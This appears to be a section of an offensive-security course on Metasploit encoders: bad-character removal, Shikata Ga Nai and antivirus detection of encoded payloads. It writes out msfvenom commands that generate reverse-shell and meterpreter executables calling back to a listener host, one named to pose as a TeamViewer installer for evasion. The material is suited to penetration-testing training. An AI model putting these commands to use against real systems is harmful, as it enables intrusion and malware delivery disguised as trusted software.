# Encoders

Encoders in Metasploit serve two primary functions: adapting payloads to run correctly on specific processor architectures and output formats, and transforming the payload's byte sequence to remove bad characters that would prevent execution. A secondary, historically significant use has been attempting to evade signature-based antivirus detection, though the effectiveness of encoding alone for this purpose has declined substantially as modern endpoint protection products have improved their analysis capabilities. Encoders are not an evasion silver bullet and should be understood as a foundational component of payload preparation rather than a reliable bypass technique on their own.

## Bad Characters and Architecture Compatibility

Bad characters are specific hexadecimal opcodes within a payload that will cause the target process to behave unexpectedly or terminate before the shellcode executes. The most common example is the null byte (`\x00`), which acts as a string terminator in C-based applications and will truncate the payload if encountered during copying or processing. Other common bad characters include carriage returns (`\x0d`) and line feeds (`\x0a`), which can be interpreted as command terminators in certain input handlers.

The `-b` flag in MSFvenom specifies which bytes must be avoided in the final payload, and the framework automatically selects a compatible encoder capable of removing them:

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

When the `-b` flag is specified without an explicit encoder, MSFvenom evaluates all compatible encoders and selects the best available option automatically.

## Shikata Ga Nai (SGN)

Shikata Ga Nai (仕方がない, "it cannot be helped") is ranked `excellent` and is the only x86 encoder at that rank in the Metasploit library. It is a polymorphic XOR additive feedback encoder, meaning every invocation produces a structurally different output by using dynamic instruction substitution, dynamic block ordering, randomly interchangeable registers, randomised instruction ordering, and junk code insertion to alter the decoder stub on each generation.

The XOR additive feedback mechanism works as follows: each instruction is XOR-encoded using a randomly selected key, then the encoded instruction is added to the key to produce the next iteration's encoding key. Decoding reverses this process in order. This self-modifying decoding behaviour made the encoder extremely difficult to detect statically for many years. However, modern AV engines and EDR products now specifically recognise the decoder stub pattern that SGN must include in every encoded payload, regardless of how the surrounding bytes differ between iterations.

## Legacy Tools: msfpayload and msfencode

Before 2015, payload generation and encoding were handled by two separate tools located in `/usr/share/framework2/`. Payloads were first generated with `msfpayload` and then piped into `msfencode` for transformation:

```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R \
  | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)
```

Both tools were deprecated in 2015 and consolidated into [MSFvenom](https://docs.rapid7.com/metasploit/msf-overview/), which handles payload generation, architecture targeting, bad character removal, and encoding in a single command.

## Selecting an Encoder in msfconsole

The `show encoders` command within a loaded exploit module displays only those encoders compatible with the current exploit and payload combination. The list is automatically filtered, so the output varies significantly between x64 and x86 modules:

```bash
# x64 payload: limited encoder options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================
   #  Name              Rank    Description
   -  ----              ----    -----------
   0  generic/eicar     manual  The EICAR Encoder
   1  generic/none      manual  The "none" Encoder
   2  x64/xor           manual  XOR Encoder
   3  x64/xor_dynamic   manual  Dynamic key XOR Encoder
   4  x64/zutto_dekiru  manual  Zutto Dekiru

# x86 payload: broader encoder availability
msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Compatible Encoders
===================
   Name                     Rank       Description
   ----                     ----       -----------
   x86/shikata_ga_nai       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/call4_dword_xor      normal     Call+4 Dword XOR Encoder
   x86/fnstenv_mov          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive    normal     Jump/Call XOR Additive Feedback Encoder
   x86/countdown            normal     Single-byte XOR Countdown Encoder
   x86/alpha_mixed          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/nonalpha             low        Non-Alpha Encoder
   <SNIP>
```

## Encoding with MSFvenom

Encoding is applied via the `-e` flag and iterated with the `-i` flag. A single encoding pass with SGN is rarely sufficient against modern AV products:

```bash
# Single pass encoding
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Payload size: 368 bytes
Final size of exe file: 73802 bytes

# Ten iteration encoding
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe

x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
...
x86/shikata_ga_nai chosen with final size 611
```

Each iteration wraps the previously encoded output in a new encoding layer, growing the payload by approximately 27 bytes per pass. Despite 10 iterations, this payload was flagged by 51 of 68 engines on VirusTotal. The reason is consistent: regardless of how many encoding layers are applied, the final executable must always include an SGN decoder stub to restore the original shellcode at runtime, and AV engines now detect that stub directly.

## Checking Detection with msf-virustotal

MSFvenom output can be submitted to [VirusTotal](https://www.virustotal.com) for detection analysis using the built-in `msf-virustotal` utility, which requires a free VirusTotal API key:

```bash
msf-virustotal -k <API key> -f TeamViewerInstall.exe

[*] Analysis Report: TeamViewerInstall.exe (51 / 68)
```

The results illustrate the current state of encoder-based evasion clearly: widely known encoder outputs are reliably detected by the majority of commercial AV and EDR products, including Microsoft Defender, CrowdStrike, SentinelOne, and Kaspersky. Meaningful AV evasion in modern environments requires techniques beyond encoding alone, including custom payload templates, in-memory execution, process injection, and obfuscation at the source or script level. These techniques are explored in the dedicated evasion section later in this module.
